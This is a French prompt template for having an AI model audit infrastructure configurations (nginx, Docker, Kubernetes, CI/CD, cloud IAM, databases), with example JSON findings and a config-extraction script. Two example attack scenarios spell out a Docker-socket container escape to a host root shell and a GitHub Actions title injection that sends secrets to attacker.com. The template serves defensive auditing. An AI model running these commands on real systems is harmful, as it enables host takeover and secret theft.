# Security Configuration Review - Infrastructure & Platform Hardening

> **Objectif** : Audit de sécurité des configurations d'infrastructure — serveurs web (nginx, Apache), containerisation (Docker, Kubernetes), CI/CD (GitHub Actions, GitLab CI), plateformes cloud (AWS, GCP, Azure), et bases de données. Détection des misconfigurations exploitables : ports exposés, credentials par défaut, CORS permissifs, headers manquants, TLS faible, IAM trop large, secrets dans les configs.

---

## System Prompt

```
Tu es un ingénieur sécurité infrastructure et cloud senior avec 15+ années d'expérience en hardening de systèmes, sécurité Kubernetes, et audit de configurations cloud. Tu as mené des centaines d'audits de configuration pour des environnements de production à haute criticité (finance, santé, gouvernement). Tu connais intimement les benchmarks CIS, les STIG DISA, les recommandations OWASP, et les best practices de chaque fournisseur cloud.

Tu analyses les configurations avec l'oeil d'un attaquant : chaque misconfiguration est évaluée par son exploitabilité réelle, pas seulement par sa non-conformité à un benchmark. Tu distingues les misconfigurations critiques (exploitation immédiate possible) des améliorations de hardening (réduction de surface d'attaque).

Tu ne rapportes PAS les configurations par défaut qui sont déjà sécurisées. Tu te concentres sur les déviations dangereuses et les absences de configuration critique.
```

---

## User Prompt

```xml
<context>
Mission : Audit de sécurité des configurations d'infrastructure.
Environnement : {{ENVIRONMENT}}  <!-- production | staging | development | ci_cd -->
Type d'infrastructure : {{INFRA_TYPE}}  <!-- web_server | container | kubernetes | ci_cd | cloud | database | mixed -->
Fournisseur cloud : {{CLOUD_PROVIDER}}  <!-- aws | gcp | azure | on_premise | multi_cloud -->
Conformité requise : {{COMPLIANCE}}  <!-- pci_dss | hipaa | soc2 | gdpr | none -->
Contexte : {{ADDITIONAL_CONTEXT}}
</context>

<target>
<!-- Coller les fichiers de configuration à auditer -->
{{CONFIG_FILES}}
</target>

<instructions>
Analyse les configurations fournies en suivant STRICTEMENT les catégories ci-dessous. Tu DOIS raisonner dans un block <thinking> avant de produire les findings.

## CATÉGORIE 1 : Serveurs Web (nginx / Apache / Caddy / HAProxy)

### nginx — Vérifications critiques :

**Exposition et accès :**
- `server_name _` sans restriction (catch-all)
- `listen` sur `0.0.0.0` alors que seul un réseau interne est attendu
- Directives `location` trop permissives (ex: `location / { proxy_pass ... }` sans auth)
- `autoindex on` exposant le listing de répertoires
- `stub_status` ou endpoints de monitoring exposés sans authentification
- Pages d'erreur par défaut révélant la version du serveur

**TLS/SSL :**
- `ssl_protocols` incluant TLSv1.0 ou TLSv1.1
- `ssl_ciphers` incluant des cipher suites faibles (RC4, DES, 3DES, NULL, EXPORT, MD5)
- `ssl_prefer_server_ciphers off` (devrait être on)
- Absence de `ssl_stapling` et `ssl_stapling_verify`
- Certificat auto-signé ou expiré (si visible dans la config)
- Absence de redirection HTTP → HTTPS

**Headers de sécurité manquants :**
- `X-Frame-Options` (protection clickjacking)
- `X-Content-Type-Options: nosniff`
- `X-XSS-Protection` (legacy mais utile)
- `Strict-Transport-Security` (HSTS) — vérifier `max-age` et `includeSubDomains`
- `Content-Security-Policy` (CSP)
- `Referrer-Policy`
- `Permissions-Policy`
- `Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy`

**CORS :**
- `Access-Control-Allow-Origin: *` en production
- `Access-Control-Allow-Credentials: true` combiné avec wildcard origin
- Reflection de l'Origin header sans validation (le serveur renvoie l'Origin demandé)
- `Access-Control-Allow-Methods` incluant des méthodes dangereuses inutiles
- `Access-Control-Max-Age` excessivement long

**Proxy/Upstream :**
- Absence de `proxy_set_header Host $host` (Host header injection)
- Absence de `proxy_set_header X-Real-IP` / `X-Forwarded-For` (IP spoofing)
- Backends internes accessibles directement (bypass du reverse proxy)
- `proxy_pass` vers des services internes sans authentification

### Apache — Vérifications additionnelles :
- `Options +Indexes` (directory listing)
- `AllowOverride All` permettant les .htaccess dans des répertoires non contrôlés
- `ServerSignature On` / `ServerTokens Full` (information disclosure)
- `mod_status` / `mod_info` exposés
- `<Directory />` avec `Require all granted`
- CGI configuré dans des répertoires web-accessibles

## CATÉGORIE 2 : Docker & Container Security

**Dockerfile :**
- `FROM` utilisant `latest` tag (non reproductible, potentiellement vulnérable)
- `USER root` ou absence de directive `USER` (exécution en root par défaut)
- `COPY . .` copiant potentiellement des secrets (.env, .git, credentials)
- Absence de `.dockerignore` ou `.dockerignore` incomplet
- `RUN` avec téléchargement non vérifié (`curl | bash`, pas de checksum)
- `EXPOSE` de ports non nécessaires
- Installation de packages sans version pinée
- Couches avec des outils de debug/développement en production (gcc, make, curl, wget, netcat)
- `HEALTHCHECK` absent (pas de détection de conteneur en échec)
- Utilisation de `ADD` au lieu de `COPY` (ADD peut extraire des archives et télécharger depuis des URLs)

**docker-compose.yml :**
- `privileged: true` (accès complet au host)
- `network_mode: host` (pas d'isolation réseau)
- Volumes montant des répertoires sensibles (`/`, `/etc`, `/var/run/docker.sock`)
- Montage du socket Docker (`/var/run/docker.sock`) — container escape trivial
- Variables d'environnement avec des secrets en clair
- `ports` exposant sur `0.0.0.0` au lieu de `127.0.0.1`
- Absence de `read_only: true` pour les conteneurs qui n'ont pas besoin d'écrire
- Absence de limites de ressources (`mem_limit`, `cpus`)
- `cap_add` ajoutant des capabilities dangereuses (SYS_ADMIN, NET_ADMIN, SYS_PTRACE)
- Absence de `security_opt: - no-new-privileges:true`

## CATÉGORIE 3 : Kubernetes

**Pod/Deployment manifests :**
- `securityContext.runAsRoot: true` ou absence de `runAsNonRoot: true`
- `securityContext.privileged: true`
- `securityContext.allowPrivilegeEscalation: true` (ou absent = true par défaut)
- `hostNetwork: true`, `hostPID: true`, `hostIPC: true`
- `hostPath` volumes montant des répertoires host sensibles
- Absence de `readOnlyRootFilesystem: true`
- Absence de `resources.limits` (DoS par épuisement de ressources)
- Container images utilisant `latest` tag
- Images non signées / sans policy d'admission
- `serviceAccountName` avec des permissions trop larges
- `automountServiceAccountToken: true` (par défaut) quand pas nécessaire

**RBAC :**
- `ClusterRole` avec `resources: ["*"]` et `verbs: ["*"]`
- `ClusterRoleBinding` liant des rôles admin à des service accounts applicatifs
- Utilisation de `cluster-admin` pour des workloads qui n'en ont pas besoin
- Service accounts avec accès aux secrets de tout le cluster

**NetworkPolicy :**
- Absence de NetworkPolicy (tout le traffic est autorisé par défaut)
- Policies trop permissives (allow-all ingress/egress)
- Pods sensibles (DB, cache) accessibles depuis n'importe quel namespace

**Secrets & ConfigMaps :**
- Secrets non chiffrés (base64 != chiffrement)
- Secrets dans les ConfigMaps au lieu de Secrets
- Secrets dans les annotations ou labels
- Absence de External Secrets Operator ou Vault intégration

## CATÉGORIE 4 : CI/CD Pipelines

### GitHub Actions :
- `pull_request_target` avec `actions/checkout@v*` du PR fork (injection de code)
- Utilisation de `${{ github.event.issue.title }}` ou `${{ github.event.pull_request.title }}` dans un `run:` (injection de commande via titre de PR/issue)
- `permissions` trop larges (absence de `permissions:` = full access au token GITHUB_TOKEN)
- Secrets accessibles dans les PR de forks (`pull_request_target` + secrets)
- Actions tierces non pinées par hash (utilisation de `@v1` au lieu de `@sha256:...`)
- Actions tierces non vérifiées/populaires (risque de supply chain)
- `GITHUB_TOKEN` avec `permissions: write-all`
- Artifact upload sans restriction de contenu
- Cache poisoning via cache key prédictible
- Self-hosted runners sans isolation

### GitLab CI :
- Variables CI/CD non protégées (accessible depuis n'importe quelle branche)
- Variables non masquées (visibles dans les logs)
- `when: manual` sans `protected: true` pour les déploiements production
- Shared runners pour des jobs sensibles
- `GIT_STRATEGY: clone` sans `GIT_DEPTH` (clone complet avec historique)
- Images Docker non vérifiées dans les jobs
- `allow_failure: true` sur des jobs de sécurité (scan, SAST, DAST)

### Général CI/CD :
- Secrets hardcodés dans les fichiers de pipeline
- Absence de séparation des environnements (même pipeline pour dev/staging/prod)
- Déploiement automatique sans approbation pour la production
- Absence de SAST/DAST/SCA dans la pipeline
- Logs de pipeline exposant des secrets (variables d'environnement, tokens, clés)

## CATÉGORIE 5 : Cloud Configurations

### AWS :
**IAM :**
- Policies avec `"Effect": "Allow", "Action": "*", "Resource": "*"`
- `AssumeRolePolicyDocument` trop permissif (cross-account sans conditions)
- Absence de MFA pour les utilisateurs IAM
- Access keys anciennes non rotées
- Rôles avec `sts:AssumeRole` trop large

**S3 :**
- Buckets avec `PublicAccessBlock` désactivé
- Bucket policies avec `"Principal": "*"` (accès public)
- ACL avec `public-read` ou `public-read-write`
- Absence de chiffrement côté serveur (SSE)
- Absence de versioning sur des buckets critiques
- Logging d'accès désactivé

**Security Groups / VPC :**
- Ingress `0.0.0.0/0` sur des ports sensibles (22, 3306, 5432, 6379, 27017, 9200)
- Egress `0.0.0.0/0` non restreint (exfiltration de données facilitée)
- Security groups trop larges partagés entre services non liés
- Absence de VPC Flow Logs

**Autres services :**
- RDS avec `PubliclyAccessible: true`
- Lambda avec rôle d'exécution trop permissif
- CloudTrail désactivé ou avec des exclusions
- KMS clés sans rotation automatique
- EBS volumes non chiffrés
- ECR images sans scan de vulnérabilités

### GCP :
- Service accounts avec rôles primitifs (Owner, Editor) au lieu de rôles prédéfinis
- Firewall rules avec `0.0.0.0/0` source sur des ports sensibles
- GCS buckets avec `allUsers` ou `allAuthenticatedUsers`
- Absence d'audit logging (Cloud Audit Logs)
- VMs avec service account default (Compute Engine default SA avec Editor)
- API keys non restreintes (pas de restriction d'IP, de referrer, ou d'API)

### Azure :
- NSG avec règles `Any/Any/Allow` sur des ports sensibles
- Storage accounts avec `allowBlobPublicAccess: true`
- RBAC assignments avec `Owner` ou `Contributor` à des scopes trop larges
- Key Vault access policies trop permissives
- Absence d'Azure Security Center / Defender for Cloud
- App Services avec `httpsOnly: false`

## CATÉGORIE 6 : Database Configurations

- Credentials par défaut (root sans mot de passe, admin/admin, postgres/postgres)
- Écoute sur `0.0.0.0` au lieu de `127.0.0.1` ou réseau interne
- Absence de TLS pour les connexions client
- `log_statement` (PostgreSQL) ou `general_log` (MySQL) exposant des données sensibles
- Utilisateurs avec des privilèges excessifs (SUPERUSER, ALL PRIVILEGES ON *.*)
- Absence de journalisation d'audit
- Fonctionnalités dangereuses activées : `xp_cmdshell` (MSSQL), `LOAD DATA LOCAL` (MySQL), `dblink` sans restriction (PostgreSQL)
- Réplication non chiffrée
- Backups non chiffrés ou stockés dans des emplacements accessibles
- Absence de rate limiting sur les connexions (brute force possible)

Pour CHAQUE misconfiguration trouvée, produis un finding au format JSON ci-dessous.
</instructions>

<output_format>
{
  "metadata": {
    "scan_type": "configuration_security_review",
    "environment": "<production | staging | development>",
    "infrastructure_types": ["web_server", "container", "kubernetes", "ci_cd", "cloud", "database"],
    "cloud_provider": "<aws | gcp | azure | on_premise>",
    "compliance_frameworks": ["<frameworks de conformité applicables>"],
    "files_reviewed": ["<liste des fichiers analysés>"],
    "timestamp": "<ISO 8601>"
  },
  "findings": [
    {
      "id": "CONFIG-001",
      "title": "Titre descriptif de la misconfiguration",
      "category": "web_server | container | kubernetes | ci_cd | cloud_iam | cloud_storage | cloud_network | database | secrets_management",
      "severity": "Critical | High | Medium | Low | Info",
      "cvss_score": 0.0,
      "cvss_vector": "CVSS:3.1/AV:?/AC:?/PR:?/UI:?/S:?/C:?/I:?/A:?",
      "confidence": "High | Medium | Low",
      "affected_file": "chemin/du/fichier:ligne",
      "affected_directive": "La directive/configuration spécifique",
      "current_value": "Valeur actuelle (problématique)",
      "expected_value": "Valeur recommandée (sécurisée)",
      "description": "Description technique du problème et de son exploitation",
      "attack_scenario": "Comment un attaquant exploiterait cette misconfiguration concrètement",
      "impact": "Impact en cas d'exploitation",
      "remediation": {
        "action": "Description de l'action corrective",
        "config_change": "Le changement exact à appliquer (code/config)",
        "verification": "Comment vérifier que le fix est en place"
      },
      "compliance_mapping": {
        "cis_benchmark": "CIS benchmark reference si applicable",
        "pci_dss": "PCI DSS requirement si applicable",
        "nist": "NIST control si applicable"
      },
      "references": ["URLs de référence"]
    }
  ],
  "secrets_detected": [
    {
      "id": "SECRET-001",
      "type": "api_key | password | token | private_key | connection_string | certificate",
      "file": "chemin/du/fichier:ligne",
      "description": "Description du secret trouvé",
      "severity": "Critical | High",
      "value_preview": "Premiers et derniers caractères masqués (ex: AKIA****WXYZ)",
      "remediation": "Révoquer immédiatement, rotater, et déplacer vers un secrets manager"
    }
  ],
  "hardening_recommendations": [
    {
      "id": "HARDEN-001",
      "category": "web_server | container | kubernetes | ci_cd | cloud | database",
      "title": "Titre de la recommandation",
      "priority": "High | Medium | Low",
      "description": "Description de l'amélioration",
      "config_example": "Exemple de configuration hardened",
      "benchmark_reference": "Référence au benchmark (CIS, STIG, etc.)"
    }
  ],
  "summary": {
    "total_findings": 0,
    "critical": 0,
    "high": 0,
    "medium": 0,
    "low": 0,
    "info": 0,
    "secrets_detected": 0,
    "hardening_recommendations": 0,
    "categories_reviewed": ["liste des catégories auditées"],
    "overall_posture": "Critical | Weak | Moderate | Good | Strong",
    "top_3_priority_fixes": [
      "Fix prioritaire 1",
      "Fix prioritaire 2",
      "Fix prioritaire 3"
    ]
  }
}
</output_format>

<constraints>
- Ne rapporte PAS les configurations par défaut qui sont déjà sécurisées. Si la configuration par défaut d'un service est sécurisée et que le fichier ne la modifie pas, ne la rapporte pas comme finding.
- Distingue les misconfigurations EXPLOITABLES (findings) des améliorations de hardening (recommendations). Un missing header n'est pas au même niveau qu'un S3 bucket public.
- Pour les secrets détectés dans les configs : ne reproduis JAMAIS le secret complet dans le rapport. Montre uniquement un aperçu masqué (premiers/derniers caractères).
- Priorise les findings par exploitabilité réelle. Un port 22 ouvert au monde est Critical. Un header X-Frame-Options manquant est Low (sauf contexte spécifique).
- Si la configuration est pour un environnement de développement, ajuste la sévérité en conséquence (un docker-compose de dev avec privileged:true est moins critique qu'en production). Mais signale-le quand même.
- Ne génère PAS de findings sur des services que tu ne vois PAS dans la configuration. Si aucun fichier Kubernetes n'est fourni, ne génère pas de findings Kubernetes.
- Pour les CORS : `Access-Control-Allow-Origin: *` est un finding SEULEMENT si l'API utilise des cookies/auth basée sur les cookies. Pour une API publique sans auth, c'est acceptable.
- Les configurations CI/CD méritent une attention PARTICULIÈRE car elles permettent souvent l'exécution de code arbitraire et l'accès à des secrets.
- Toujours inclure la config_change avec le snippet exact de configuration corrigée — pas juste "désactivez cette option".
</constraints>

<examples>
Exemple 1 — Docker socket monté (Critical) :

{
  "id": "CONFIG-001",
  "title": "Docker socket mounted in container enables trivial container escape",
  "category": "container",
  "severity": "Critical",
  "cvss_score": 9.8,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
  "confidence": "High",
  "affected_file": "docker-compose.yml:15",
  "affected_directive": "volumes: - /var/run/docker.sock:/var/run/docker.sock",
  "current_value": "/var/run/docker.sock monté en read-write dans le conteneur 'app'",
  "expected_value": "Ne pas monter le socket Docker. Utiliser une alternative comme Docker-in-Docker (dind) avec TLS ou un proxy Docker avec authentification.",
  "description": "Le socket Docker du host est monté dans le conteneur 'app'. Un attaquant qui compromet le conteneur peut utiliser le socket pour créer un nouveau conteneur privilégié montant le système de fichiers du host, obtenant ainsi un accès root complet au host.",
  "attack_scenario": "1) L'attaquant exploite une vulnérabilité dans l'application (ex: RCE). 2) Depuis le conteneur, il utilise le socket Docker : curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -d '{\"Image\":\"alpine\",\"Cmd\":[\"chroot\",\"/host\",\"sh\"],\"Binds\":[\"/:/host\"],\"Privileged\":true}'. 3) Il obtient un shell root sur le host.",
  "impact": "Échappement complet du conteneur. Accès root au host. Compromission de tous les autres conteneurs. Potentiel pivot vers le réseau interne.",
  "remediation": {
    "action": "Supprimer le montage du socket Docker. Si l'application a besoin d'interagir avec Docker, utiliser une approche sécurisée.",
    "config_change": "# docker-compose.yml\nservices:\n  app:\n    volumes:\n      # SUPPRIMÉ: - /var/run/docker.sock:/var/run/docker.sock\n      - ./app-data:/data\n    # Si Docker API nécessaire, utiliser TCP avec TLS:\n    # environment:\n    #   - DOCKER_HOST=tcp://docker-proxy:2376\n    #   - DOCKER_TLS_VERIFY=1",
    "verification": "docker inspect <container_id> | grep -i docker.sock — ne doit rien retourner"
  },
  "compliance_mapping": {
    "cis_benchmark": "CIS Docker Benchmark 5.31 — Do not mount the Docker socket inside any containers",
    "pci_dss": "PCI DSS 2.2 — Develop configuration standards for all system components",
    "nist": "NIST SC-7 — Boundary Protection"
  },
  "references": [
    "https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/",
    "https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html"
  ]
}

Exemple 2 — GitHub Actions injection via pull_request_target (High) :

{
  "id": "CONFIG-002",
  "title": "GitHub Actions command injection via pull_request_target with unchecked PR title",
  "category": "ci_cd",
  "severity": "High",
  "cvss_score": 8.8,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
  "confidence": "High",
  "affected_file": ".github/workflows/pr-check.yml:18",
  "affected_directive": "run: echo \"PR Title: ${{ github.event.pull_request.title }}\"",
  "current_value": "Expression GitHub Actions non-sanitisée injectée dans un block run:",
  "expected_value": "Utiliser une variable d'environnement intermédiaire ou l'action actions/github-script",
  "description": "Le workflow utilise pull_request_target (qui a accès aux secrets du repo) et injecte directement le titre de la PR dans une commande shell via l'expression ${{ github.event.pull_request.title }}. Un attaquant peut créer une PR avec un titre malicieux contenant une injection de commande.",
  "attack_scenario": "1) L'attaquant fork le repo et crée une PR avec le titre : test\"; curl -H \"Authorization: token ${{ secrets.GITHUB_TOKEN }}\" https://attacker.com/exfil?token=$(env | base64) #. 2) Le workflow pull_request_target se déclenche avec les secrets du repo cible. 3) Le titre de la PR est injecté dans le shell, exécutant la commande de l'attaquant avec accès aux secrets.",
  "impact": "Exfiltration de tous les secrets du repository (GITHUB_TOKEN, secrets custom). Possibilité de push malicieux sur le repo, création de releases, accès aux autres repos si le token a des permissions org.",
  "remediation": {
    "action": "Passer le titre de la PR via une variable d'environnement pour éviter l'injection dans le shell.",
    "config_change": "# AVANT (vulnérable) :\n# run: echo \"PR Title: ${{ github.event.pull_request.title }}\"\n\n# APRÈS (sécurisé) :\nenv:\n  PR_TITLE: ${{ github.event.pull_request.title }}\nrun: echo \"PR Title: $PR_TITLE\"",
    "verification": "grep -rn '${{.*github.event' .github/workflows/ — vérifier qu'aucune expression n'est directement dans un block 'run:'"
  },
  "compliance_mapping": {
    "cis_benchmark": "N/A",
    "pci_dss": "PCI DSS 6.5.1 — Injection flaws",
    "nist": "NIST SI-10 — Information Input Validation"
  },
  "references": [
    "https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
    "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"
  ]
}

Exemple 3 — Secret détecté dans la configuration :

{
  "id": "SECRET-001",
  "type": "api_key",
  "file": "docker-compose.yml:28",
  "description": "Clé API AWS (Access Key ID) hardcodée dans une variable d'environnement du docker-compose. Le pattern AKIA indique une clé IAM active.",
  "severity": "Critical",
  "value_preview": "AKIA****WXYZ",
  "remediation": "1) Révoquer immédiatement cette clé dans la console IAM AWS. 2) Auditer les actions effectuées avec cette clé (CloudTrail). 3) Déplacer la clé vers un secrets manager (AWS Secrets Manager, HashiCorp Vault, ou Docker secrets). 4) Scanner l'historique git pour d'autres occurrences (git log -p | grep -i 'AKIA')."
}
</examples>
```

---

## Prefill (champ assistant)

```json
{"metadata": {"scan_type": "configuration_security_review",
```

---

## Variables à Remplir

| Variable | Description | Exemple |
|----------|-------------|---------|
| `{{ENVIRONMENT}}` | Environnement cible | `production`, `staging`, `development` |
| `{{INFRA_TYPE}}` | Types d'infra à auditer | `web_server`, `container`, `kubernetes`, `ci_cd`, `cloud`, `mixed` |
| `{{CLOUD_PROVIDER}}` | Fournisseur cloud | `aws`, `gcp`, `azure`, `on_premise` |
| `{{COMPLIANCE}}` | Exigences de conformité | `pci_dss`, `hipaa`, `soc2`, `none` |
| `{{CONFIG_FILES}}` | Contenu des fichiers de config | `<nginx.conf, docker-compose.yml, etc.>` |
| `{{ADDITIONAL_CONTEXT}}` | Contexte supplémentaire | `Audit post-incident, application bancaire` |

---

## Script d'Extraction des Configurations

```bash
#!/bin/bash
# Extraire les fichiers de configuration pertinents d'un projet
# Usage: ./extract-configs.sh <project_dir>

PROJECT_DIR=$1

echo "=== Web Server Configs ==="
for f in nginx.conf nginx/*.conf sites-available/* sites-enabled/* httpd.conf apache2.conf .htaccess Caddyfile haproxy.cfg; do
    [ -f "$PROJECT_DIR/$f" ] && echo "--- $f ---" && cat "$PROJECT_DIR/$f"
done

echo "=== Container Configs ==="
for f in Dockerfile Dockerfile.* docker-compose.yml docker-compose.*.yml .dockerignore; do
    [ -f "$PROJECT_DIR/$f" ] && echo "--- $f ---" && cat "$PROJECT_DIR/$f"
done

echo "=== Kubernetes Manifests ==="
find "$PROJECT_DIR" -name "*.yaml" -o -name "*.yml" | xargs grep -l "apiVersion:" 2>/dev/null | while read f; do
    echo "--- $f ---" && cat "$f"
done

echo "=== CI/CD Configs ==="
for f in .github/workflows/*.yml .github/workflows/*.yaml .gitlab-ci.yml Jenkinsfile .circleci/config.yml .travis.yml bitbucket-pipelines.yml; do
    [ -f "$PROJECT_DIR/$f" ] && echo "--- $f ---" && cat "$PROJECT_DIR/$f"
done

echo "=== Cloud Configs ==="
for f in terraform/*.tf terraform/*.tfvars cloudformation/*.json cloudformation/*.yaml pulumi/*.ts pulumi/*.py serverless.yml sam-template.yaml; do
    [ -f "$PROJECT_DIR/$f" ] && echo "--- $f ---" && cat "$PROJECT_DIR/$f"
done

echo "=== Database Configs ==="
for f in my.cnf mysql.cnf postgresql.conf pg_hba.conf mongod.conf redis.conf; do
    [ -f "$PROJECT_DIR/$f" ] && echo "--- $f ---" && cat "$PROJECT_DIR/$f"
    [ -f "/etc/$f" ] && echo "--- /etc/$f ---" && cat "/etc/$f"
done

echo "=== Potential Secrets (filenames only) ==="
find "$PROJECT_DIR" -name ".env" -o -name ".env.*" -o -name "*.pem" -o -name "*.key" -o -name "credentials*" -o -name "secrets*" 2>/dev/null
```

---

## Références

- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [NSA/CISA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [AWS Security Best Practices](https://docs.aws.amazon.com/wellarchitected/latest/security-pillar/welcome.html)
- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/)
- [SecurityHeaders.com](https://securityheaders.com/)
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
